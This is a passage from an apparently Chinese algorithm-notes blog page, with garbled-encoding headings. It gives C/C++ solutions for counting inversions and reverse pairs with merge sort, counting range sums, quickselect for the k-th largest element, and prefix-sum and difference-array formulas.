];<br>        &#125;<br>        <span class="hljs-keyword">else</span>&#123; <br>            tmp[k ++ ] = q[j ++ ];<br>        &#125;<br>    <span class="hljs-keyword">while</span> (i &lt;= mid) tmp[k ++ ] = q[i ++ ];<br>    <span class="hljs-keyword">while</span> (j &lt;= r) tmp[k ++ ] = q[j ++ ];<br>    <span class="hljs-keyword">for</span> (i = l, j = <span class="hljs-number">0</span>; i &lt;= r; i ++, j ++ ) q[i] = tmp[j];<br>    <span class="hljs-keyword">return</span> res;<br>&#125;<br></code></pre></td></tr></table></figure><h5 id="é€†åºå¯¹é—®é¢˜"><a href="#é€†åºå¯¹é—®é¢˜" class="headerlink" title="é€†åºå¯¹é—®é¢˜"></a>é€†åºå¯¹é—®é¢˜</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// å½’å¹¶æ’åºè®¡ç®—é€†åºå¯¹</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">merge_sort</span><span class="hljs-params">(<span class="hljs-type">int</span> q[], <span class="hljs-type">int</span> l, <span class="hljs-type">int</span> r)</span> &#123;<br>    <span class="hljs-type">int</span> temp[<span class="hljs-number">1000</span>];  <span class="hljs-comment">// ä¸´æ—¶æ•°ç»„</span><br>    <span class="hljs-keyword">if</span> (l &gt;= r) <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;  <span class="hljs-comment">// é€’å½’çš„ç»ˆæ­¢æ¡ä»¶</span><br>    <br>    <span class="hljs-type">int</span> mid = (l + r) &gt;&gt; <span class="hljs-number">1</span>;  <span class="hljs-comment">// æ‰¾åˆ°ä¸­ç‚¹</span><br>    <span class="hljs-type">int</span> res = <span class="hljs-number">0</span>;  <span class="hljs-comment">// ç»Ÿè®¡é€†åºå¯¹çš„ç»“æœ</span><br>    <br>    <span class="hljs-comment">// é€’å½’è°ƒç”¨å½’å¹¶æ’åºï¼Œå¤„ç†å·¦å³ä¸¤éƒ¨åˆ†</span><br>    res += merge_sort(q, l, mid);<br>    res += merge_sort(q, mid + <span class="hljs-number">1</span>, r);<br>    <br>    <span class="hljs-comment">// åˆå¹¶è¿‡ç¨‹ä¸­ï¼Œç»Ÿè®¡ç¬¦åˆæ¡ä»¶çš„é€†åºå¯¹</span><br>    <span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">int</span>&gt; <span class="hljs-title function_">tmp</span><span class="hljs-params">(r - l + <span class="hljs-number">1</span>)</span>;  <span class="hljs-comment">// ä¸´æ—¶æ•°ç»„ï¼Œå¤§å°ä¸ºå½’å¹¶åæ•°ç»„çš„å¤§å°</span><br>    <span class="hljs-type">int</span> k = <span class="hljs-number">0</span>, i = l, j = mid + <span class="hljs-number">1</span>;<br><br>    <span class="hljs-comment">// ç»Ÿè®¡ç¬¦åˆæ¡ä»¶çš„æ•° (é€†åºå¯¹)</span><br>    <span class="hljs-keyword">for</span> (i = l; i &lt;= mid; i++) &#123;<br>        <span class="hljs-keyword">while</span> (j &lt;= r &amp;&amp; q[i] &gt; q[j]) &#123;  <span class="hljs-comment">// æ¯”è¾ƒå·¦å³ä¸¤éƒ¨åˆ†çš„å…ƒç´ </span><br>            j++;  <span class="hljs-comment">// æ‰¾åˆ°æ‰€æœ‰æ»¡è¶³æ¡ä»¶çš„å³ä¾§å…ƒç´ </span><br>        &#125;<br>        res += (j - (mid + <span class="hljs-number">1</span>));  <span class="hljs-comment">// ç´¯åŠ é€†åºå¯¹</span><br>    &#125;<br><br>    <span class="hljs-comment">// åˆå¹¶è¿‡ç¨‹</span><br>    i = l;  <span class="hljs-comment">// é‡ç½® i å’Œ j ç”¨äºåˆå¹¶æ“ä½œ</span><br>    j = mid + <span class="hljs-number">1</span>;<br>    <span class="hljs-keyword">while</span> (i &lt;= mid &amp;&amp; j &lt;= r) &#123;<br>        <span class="hljs-keyword">if</span> (q[i] &lt;= q[j]) &#123;<br>            tmp[k++] = q[i++];  <span class="hljs-comment">// å·¦è¾¹çš„å…ƒç´ è¾ƒå°</span><br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            tmp[k++] = q[j++];  <span class="hljs-comment">// å³è¾¹çš„å…ƒç´ è¾ƒå°</span><br>        &#125;<br>    &#125;<br><br>    <span class="hljs-comment">// å°†å‰©ä½™å…ƒç´ æ”¾å…¥ä¸´æ—¶æ•°ç»„</span><br>    <span class="hljs-keyword">while</span> (i &lt;= mid) tmp[k++] = q[i++];<br>    <span class="hljs-keyword">while</span> (j &lt;= r) tmp[k++] = q[j++];<br><br><br>    <span class="hljs-comment">// å°†ä¸´æ—¶æ•°ç»„çš„å…ƒç´ æ‹·è´å›åŸæ•°ç»„</span><br>    <span class="hljs-keyword">for</span> (i = l, j = <span class="hljs-number">0</span>; i &lt;= r; i++, j++) &#123;<br>        q[i] = tmp[j];<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> res;  <span class="hljs-comment">// è¿”å›å½“å‰ç»Ÿè®¡çš„ç»“æœ</span><br>&#125;<br><br><br></code></pre></td></tr></table></figure><h5 id="è‡ªå®šä¹‰é—®é¢˜"><a href="#è‡ªå®šä¹‰é—®é¢˜" class="headerlink" title="è‡ªå®šä¹‰é—®é¢˜"></a>è‡ªå®šä¹‰é—®é¢˜</h5><p>numçš„å³è¾¹æœ‰å¤šå°‘ä¸ªæ•°*2ä¹‹åä¾ç„¶&lt;num è¿™ä¸ªæ–¹æ¡ˆè®¾è®¡äº†Ræ¥è®©å…¶æ»‘åŠ¨çª—å£</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// å½’å¹¶æ’åºè®¡ç®—é€†åºå¯¹</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">merge_sort</span><span class="hljs-params">(<span class="hljs-type">int</span> q[], <span class="hljs-type">int</span> l, <span class="hljs-type">int</span> r)</span> &#123;<br>    <span class="hljs-type">int</span> temp[<span class="hljs-number">1000</span>];  <span class="hljs-comment">// ä¸´æ—¶æ•°ç»„</span><br>    <span class="hljs-keyword">if</span> (l &gt;= r) <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;  <span class="hljs-comment">// é€’å½’çš„ç»ˆæ­¢æ¡ä»¶</span><br>    <br>    <span class="hljs-type">int</span> mid = (l + r) &gt;&gt; <span class="hljs-number">1</span>;  <span class="hljs-comment">// æ‰¾åˆ°ä¸­ç‚¹</span><br>    <span class="hljs-type">int</span> res = <span class="hljs-number">0</span>;  <span class="hljs-comment">// ç»Ÿè®¡é€†åºå¯¹çš„ç»“æœ</span><br>    <br>    <span class="hljs-comment">// é€’å½’è°ƒç”¨å½’å¹¶æ’åºï¼Œå¤„ç†å·¦å³ä¸¤éƒ¨åˆ†</span><br>    res += merge_sort(q, l, mid);<br>    res += merge_sort(q, mid + <span class="hljs-number">1</span>, r);<br>    <br>    <span class="hljs-comment">// åˆå¹¶è¿‡ç¨‹ä¸­ï¼Œç»Ÿè®¡ç¬¦åˆæ¡ä»¶çš„é€†åºå¯¹</span><br>    <span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">int</span>&gt; <span class="hljs-title function_">tmp</span><span class="hljs-params">(r - l + <span class="hljs-number">1</span>)</span>;  <span class="hljs-comment">// ä¸´æ—¶æ•°ç»„ï¼Œå¤§å°ä¸ºå½’å¹¶åæ•°ç»„çš„å¤§å°</span><br>    <span class="hljs-type">int</span> k = <span class="hljs-number">0</span>, i = l, j = mid + <span class="hljs-number">1</span>;<br><br>    <span class="hljs-comment">// ç»Ÿè®¡ç¬¦åˆæ¡ä»¶çš„æ•° (é€†åºå¯¹)</span><br>    <span class="hljs-keyword">for</span> (i = l; i &lt;= mid; i++) &#123;<br>        <span class="hljs-comment">// å¯¹äºæ¯ä¸ª q[i]ï¼Œå¯»æ‰¾å³ä¾§æ‰€æœ‰ q[j] æ»¡è¶³ q[i] &gt; 2 * q[j]</span><br>        <span class="hljs-comment">// è¿™é‡Œæˆ‘ä»¬å®ç°äº†ä¸€ä¸ªæ»‘åŠ¨çª—å£ï¼Œj ä» mid+1 å¼€å§‹ï¼Œå¹¶å‘å³æ»‘åŠ¨</span><br>        <span class="hljs-keyword">while</span> (j &lt;= r &amp;&amp; (<span class="hljs-type">long</span>)q[i] &gt; (<span class="hljs-type">long</span>)q[j] * <span class="hljs-number">2</span>) &#123;<br>            j++;  <span class="hljs-comment">// å³ä¾§å…ƒç´ å¤§äº q[i] * 2 çš„ä¸ªæ•°</span><br>        &#125;<br>        res += (j - (mid + <span class="hljs-number">1</span>));  <span class="hljs-comment">// ç´¯åŠ é€†åºå¯¹çš„ä¸ªæ•°</span><br>    &#125;<br><br>    <span class="hljs-comment">// åˆå¹¶è¿‡ç¨‹</span><br>    i = l;  <span class="hljs-comment">// é‡ç½® i å’Œ j ç”¨äºåˆå¹¶æ“ä½œ</span><br>    j = mid + <span class="hljs-number">1</span>;<br>    <span class="hljs-keyword">while</span> (i &lt;= mid &amp;&amp; j &lt;= r) &#123;<br>        <span class="hljs-keyword">if</span> (q[i] &lt;= q[j]) &#123;<br>            tmp[k++] = q[i++];  <span class="hljs-comment">// å·¦è¾¹çš„å…ƒç´ è¾ƒå°</span><br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            tmp[k++] = q[j++];  <span class="hljs-comment">// å³è¾¹çš„å…ƒç´ è¾ƒå°</span><br>        &#125;<br>    &#125;<br><br>    <span class="hljs-comment">// å°†å‰©ä½™å…ƒç´ æ”¾å…¥ä¸´æ—¶æ•°ç»„</span><br>    <span class="hljs-keyword">while</span> (i &lt;= mid) tmp[k++] = q[i++];<br>    <span class="hljs-keyword">while</span> (j &lt;= r) tmp[k++] = q[j++];<br><br>    <span class="hljs-comment">// å°†ä¸´æ—¶æ•°ç»„çš„å…ƒç´ æ‹·è´å›åŸæ•°ç»„</span><br>    <span class="hljs-keyword">for</span> (i = l, j = <span class="hljs-number">0</span>; i &lt;= r; i++, j++) &#123;<br>        q[i] = tmp[j];<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> res;  <span class="hljs-comment">// è¿”å›å½“å‰ç»Ÿè®¡çš„ç»“æœ</span><br>&#125;<br><br></code></pre></td></tr></table></figure><h5 id="æ¯”è¾ƒä¸€ä¸ªåŒºé—´çš„é—®é¢˜"><a href="#æ¯”è¾ƒä¸€ä¸ªåŒºé—´çš„é—®é¢˜" class="headerlink" title="æ¯”è¾ƒä¸€ä¸ªåŒºé—´çš„é—®é¢˜"></a>æ¯”è¾ƒä¸€ä¸ªåŒºé—´çš„é—®é¢˜</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// åˆå¹¶æ’åºè®¡ç®—åŒºé—´å’Œåœ¨ [lower, upper] èŒƒå›´å†…çš„æ•°é‡</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">merge_sort</span><span class="hljs-params">(<span class="hljs-built_in">std</span>::<span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">int</span>&gt;&amp; nums, <span class="hljs-type">int</span> l, <span class="hljs-type">int</span> r, <span class="hljs-type">int</span> lower, <span class="hljs-type">int</span> upper)</span> &#123;<br>    <span class="hljs-keyword">if</span> (l &gt;= r) <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br><br>    <span class="hljs-type">int</span> mid = (l + r) &gt;&gt; <span class="hljs-number">1</span>;<br>    <span class="hljs-type">int</span> res = <span class="hljs-number">0</span>;<br><br>    <span class="hljs-comment">// é€’å½’è°ƒç”¨å½’å¹¶æ’åºï¼Œç»Ÿè®¡å·¦åŠéƒ¨åˆ†å’Œå³åŠéƒ¨åˆ†</span><br>    res += merge_sort(nums, l, mid, lower, upper);<br>    res += merge_sort(nums, mid + <span class="hljs-number">1</span>, r, lower, upper);<br><br>    <span class="hljs-built_in">std</span>::<span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">int</span>&gt; <span class="hljs-title function_">tmp</span><span class="hljs-params">(r - l + <span class="hljs-number">1</span>)</span>;<br>    <span class="hljs-type">int</span> i = l, j = mid + <span class="hljs-number">1</span>, k = <span class="hljs-number">0</span>;<br>    <br>    <span class="hljs-comment">// ç»Ÿè®¡ç¬¦åˆæ¡ä»¶çš„æ•° (åŒºé—´å’Œåœ¨ lower, upper èŒƒå›´å†…)</span><br>    <span class="hljs-type">int</span> windowL = l;<br>    <span class="hljs-type">int</span> windowR = l;<br>    <br>    <span class="hljs-keyword">for</span> (i = j; i &lt;= r; i++) &#123;<br>        <span class="hljs-type">long</span> min_val = nums[i] - upper;<br>        <span class="hljs-type">long</span> max_val = nums[i] - lower;<br><br>        <span class="hljs-keyword">while</span> (windowR &lt;= mid &amp;&amp; nums[windowR] &lt;= max_val) &#123;<br>            windowR++;<br>        &#125;<br>        <span class="hljs-keyword">while</span> (windowL &lt;= mid &amp;&amp; nums[windowL] &lt; min_val) &#123;<br>            windowL++;<br>        &#125;<br><br>        res += windowR - windowL;<br>    &#125;<br><br>    <span class="hljs-comment">// åˆå¹¶è¿‡ç¨‹</span><br>    i = l;<br>    j = mid + <span class="hljs-number">1</span>;<br>    <span class="hljs-keyword">while</span> (i &lt;= mid &amp;&amp; j &lt;= r) &#123;<br>        <span class="hljs-keyword">if</span> (nums[i] &lt;= nums[j]) &#123;<br>            tmp[k++] = nums[i++];<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            tmp[k++] = nums[j++];<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-comment">// å°†å‰©ä½™å…ƒç´ æ”¾å…¥ä¸´æ—¶æ•°ç»„</span><br>    <span class="hljs-keyword">while</span> (i &lt;= mid) tmp[k++] = nums[i++];<br>    <span class="hljs-keyword">while</span> (j &lt;= r) tmp[k++] = nums[j++];<br><br>    <span class="hljs-comment">// å°†ä¸´æ—¶æ•°ç»„çš„å…ƒç´ æ‹·è´å›åŸæ•°ç»„</span><br>    <span class="hljs-keyword">for</span> (i = l, k = <span class="hljs-number">0</span>; i &lt;= r; i++, k++) &#123;<br>        nums[i] = tmp[k];<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> res;  <span class="hljs-comment">// è¿”å›å½“å‰ç»Ÿè®¡çš„ç»“æœ</span><br>&#125;<br></code></pre></td></tr></table></figure><h4 id="æŸ¥æ‰¾ç¬¬-k-å¤§å…ƒç´ "><a href="#æŸ¥æ‰¾ç¬¬-k-å¤§å…ƒç´ " class="headerlink" title="æŸ¥æ‰¾ç¬¬ k å¤§å…ƒç´ "></a>æŸ¥æ‰¾ç¬¬ <code>k</code> å¤§å…ƒç´ </h4><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">findKthLargest</span><span class="hljs-params">(vector&lt;<span class="hljs-type">int</span>&gt;&amp; nums, <span class="hljs-type">int</span> k)</span> </span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-built_in">quickSort</span>(nums, <span class="hljs-number">0</span>, nums.<span class="hljs-built_in">size</span>() - <span class="hljs-number">1</span>, nums.<span class="hljs-built_in">size</span>() - k);<br>    &#125;<br><br><span class="hljs-keyword">private</span>:<br>    <span class="hljs-comment">// quickSort å‡½æ•°ï¼šç”¨äºæŸ¥æ‰¾åœ¨æ’åºåä½ç½®ä¸º index çš„å…ƒç´ çš„å€¼</span><br>    <span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">quickSort</span><span class="hljs-params">(vector&lt;<span class="hljs-type">int</span>&gt;&amp; arr, <span class="hljs-type">int</span> l, <span class="hljs-type">int</span> r, <span class="hljs-type">int</span> index)</span> </span>&#123;<br>        <span class="hljs-keyword">if</span> (l &gt;= r) <span class="hljs-keyword">return</span> arr[l];<br>        <span class="hljs-type">int</span> pivot = <span class="hljs-built_in">partition</span>(arr, l, r);<br>        <span class="hljs-keyword">if</span> (index == pivot) <span class="hljs-keyword">return</span> arr[pivot];<br>        <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (index &lt; pivot) <span class="hljs-keyword">return</span> <span class="hljs-built_in">quickSort</span>(arr, l, pivot - <span class="hljs-number">1</span>, index);<br>        <span class="hljs-keyword">else</span> <span class="hljs-keyword">return</span> <span class="hljs-built_in">quickSort</span>(arr, pivot + <span class="hljs-number">1</span>, r, index);<br>    &#125;<br><br>    <span class="hljs-comment">// partition å‡½æ•°ï¼šåˆ†åŒºæ“ä½œï¼Œè¿”å›åˆ†åŒºä½ç½®</span><br>    <span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">partition</span><span class="hljs-params">(vector&lt;<span class="hljs-type">int</span>&gt;&amp; a, <span class="hljs-type">int</span> l, <span class="hljs-type">int</span> r)</span> </span>&#123;<br>        <span class="hljs-type">int</span> pivot = l + <span class="hljs-built_in">rand</span>() % (r - l + <span class="hljs-number">1</span>);<br>        <span class="hljs-type">int</span> pivotVal = a[pivot];<br><br>        <span class="hljs-keyword">while</span> (l &lt;= r) &#123;<br>            <span class="hljs-keyword">while</span> (a[l] &lt; pivotVal) l++;<br>            <span class="hljs-keyword">while</span> (a[r] &gt; pivotVal) r--;<br>            <span class="hljs-keyword">if</span> (l == r) <span class="hljs-keyword">break</span>;<br>            <span class="hljs-keyword">if</span> (l &lt; r) &#123;<br>                <span class="hljs-type">int</span> temp = a[l];<br>                a[l] = a[r];<br>                a[r] = temp;<br>                l++;<br>                r--;<br>            &#125;<br>        &#125;<br>        <br>        <span class="hljs-keyword">return</span> r;<br>    &#125;<br>&#125;;<br><br></code></pre></td></tr></table></figure><h4 id="ç¿»è½¬å¯¹"><a href="#ç¿»è½¬å¯¹" class="headerlink" title="ç¿»è½¬å¯¹"></a>ç¿»è½¬å¯¹</h4><p>é¢˜ç›®è¦æ±‚åœ¨ä¸€ä¸ªæ•°ç»„ä¸­æ‰¾åˆ°æ»¡è¶³æ¡ä»¶ <code>nums[i] &gt; 2 * nums[j]</code> çš„æ‰€æœ‰ä¸‹æ ‡å¯¹ <code>(i, j)</code>ï¼Œå…¶ä¸­ <code>i &lt; j</code>ã€‚</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">reversePairs</span><span class="hljs-params">(vector&lt;<span class="hljs-type">int</span>&gt;&amp; nums)</span> </span>&#123;<br>        ans = <span class="hljs-number">0</span>;<br>        <span class="hljs-built_in">mergeSort</span>(nums, <span class="hljs-number">0</span>, nums.<span class="hljs-built_in">size</span>() - <span class="hljs-number">1</span>);<br>        <span class="hljs-keyword">return</span> ans;<br>    &#125;<br><br><span class="hljs-keyword">private</span>:<br>    <span class="hljs-type">int</span> ans;  <span class="hljs-comment">// å…¨å±€å˜é‡ï¼Œè®°å½•ç¿»è½¬å¯¹æ•°é‡</span><br><br>    <span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">mergeSort</span><span class="hljs-params">(vector&lt;<span class="hljs-type">int</span>&gt;&amp; arr, <span class="hljs-type">int</span> l, <span class="hljs-type">int</span> r)</span> </span>&#123;<br>        <span class="hljs-keyword">if</span> (l &gt;= r) <span class="hljs-keyword">return</span>;<br>        <span class="hljs-type">int</span> mid = (l + r) / <span class="hljs-number">2</span>;<br>        <span class="hljs-built_in">mergeSort</span>(arr, l, mid);<br>        <span class="hljs-built_in">mergeSort</span>(arr, mid + <span class="hljs-number">1</span>, r);<br>        <span class="hljs-built_in">calculate</span>(arr, l, mid, r);<br>        <span class="hljs-built_in">merge</span>(arr, l, mid, r);<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">calculate</span><span class="hljs-params">(vector&lt;<span class="hljs-type">int</span>&gt;&amp; arr, <span class="hljs-type">int</span> left, <span class="hljs-type">int</span> mid, <span class="hljs-type">int</span> right)</span> </span>&#123;<br>        <span class="hljs-type">int</span> j = mid + <span class="hljs-number">1</span>;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = left; i &lt;= mid; i++) &#123;<br>            <span class="hljs-keyword">while</span> (j &lt;= right &amp;&amp; arr[i] &gt; <span class="hljs-number">2LL</span> * arr[j]) j++;<br>            ans += j - (mid + <span class="hljs-number">1</span>);  <span class="hljs-comment">// ç´¯åŠ ç¬¦åˆæ¡ä»¶çš„å¯¹æ•°</span><br>        &#125;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">merge</span><span class="hljs-params">(vector&lt;<span class="hljs-type">int</span>&gt;&amp; arr, <span class="hljs-type">int</span> left, <span class="hljs-type">int</span> mid, <span class="hljs-type">int</span> right)</span> </span>&#123;<br>        <span class="hljs-function">vector&lt;<span class="hljs-type">int</span>&gt; <span class="hljs-title">temp</span><span class="hljs-params">(right - left + <span class="hljs-number">1</span>)</span></span>;<br>        <span class="hljs-type">int</span> i = left, j = mid + <span class="hljs-number">1</span>, k = <span class="hljs-number">0</span>;<br><br>        <span class="hljs-keyword">while</span> (i &lt;= mid &amp;&amp; j &lt;= right) &#123;<br>            <span class="hljs-keyword">if</span> (arr[i] &lt;= arr[j]) temp[k++] = arr[i++];<br>            <span class="hljs-keyword">else</span> temp[k++] = arr[j++];<br>        &#125;<br>        <span class="hljs-keyword">while</span> (i &lt;= mid) temp[k++] = arr[i++];<br>        <span class="hljs-keyword">while</span> (j &lt;= right) temp[k++] = arr[j++];<br><br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; temp.<span class="hljs-built_in">size</span>(); i++) arr[left + i] = temp[i];<br>    &#125;<br>&#125;;<br><br></code></pre></td></tr></table></figure><h2 id="ä¸‰-å‰ç¼€å’Œ"><a href="#ä¸‰-å‰ç¼€å’Œ" class="headerlink" title="ä¸‰.å‰ç¼€å’Œ"></a>ä¸‰.å‰ç¼€å’Œ</h2><p>ä¸€ç»´å‰ç¼€å’Œ<br>S[i] &#x3D; a[1] + a[2] + â€¦ a[i]<br>a[l] + â€¦ + a[r] &#x3D; S[r] - S[l - 1]</p><p>ä¸€ç»´å·®åˆ†<br>ç»™åŒºé—´[l, r]ä¸­çš„æ¯ä¸ªæ•°åŠ ä¸Šcï¼šB[l] +&#x3D; c, B[r + 1] -&#x3D; c</p><p>äºŒç»´å‰ç¼€å’Œ<br>S[i, j] &#x3D; ç¬¬iè¡Œjåˆ—æ ¼å­å·¦ä¸Šéƒ¨åˆ†æ‰€æœ‰å…ƒç´ çš„å’Œ<br>ä»¥(x1, y1)ä¸ºå·¦ä¸Šè§’ï¼Œ(x2, y2)ä¸ºå³ä¸‹è§’çš„å­çŸ©é˜µçš„å’Œä¸ºï¼š<br>S[x2, y2] - S[x1 - 1, y2] - S[x2, y1 - 1] + S[x1 - 1, y1 - 1]</p><p>äºŒç»´å·®åˆ†<br>ç»™ä»¥(x1, y1)ä¸ºå·¦ä¸Šè§’ï¼Œ(x2, y2)ä¸ºå³ä¸‹è§’çš„å­çŸ©é˜µä¸­çš„æ‰€æœ‰å…ƒç´ åŠ ä¸Šcï¼š<br>S[x1, y1] +&#x3D; c, S[x2 + 1, y1] -&#x3D; c, S[x1, y2 + 1] -&#x3D; c, S[x2 + 1, y2 + 1] +&#x3D; c</p><h3 id="ä¸€ç»´å‰ç¼€å’Œ"><a href="#ä¸€ç»´å‰ç¼€å’Œ" class="headerlink" title="ä¸€ç»´å‰ç¼€å’Œ"></a>ä¸€ç»´å‰ç¼€å’Œ</h3><p>å®šä¹‰ï¼šå‰ç¼€å’Œæ•°ç»„æ˜¯ç”¨äºå¿«é€Ÿè®¡ç®—æ•°ç»„ä»»æ„åŒºé—´å’Œçš„è¾…åŠ©æ•°ç»„ã€‚<code>S[i]</code> è¡¨ç¤ºä»æ•°ç»„å¼€å¤´åˆ°ç¬¬ <code>i</code> ä¸ªå…ƒç´ çš„ç´¯åŠ å’Œã€‚</p><p>å…¬å¼ï¼š</p><ul><li>åŸºæœ¬å…¬å¼ï¼š<code>S[i] = S[i-1] + A[i]</code></li><li>åŒºé—´å’Œå…¬å¼ï¼šè¦è®¡ç®—åŸæ•°ç»„ <code>A</code> ä¸­ <code>[i, j]</code> åŒºé—´çš„å’Œï¼Œå¯ä»¥ä½¿ç”¨å‰ç¼€å’Œæ•°ç»„ï¼š<code>sum(i, j) = S[j] - S[i-1]</code>  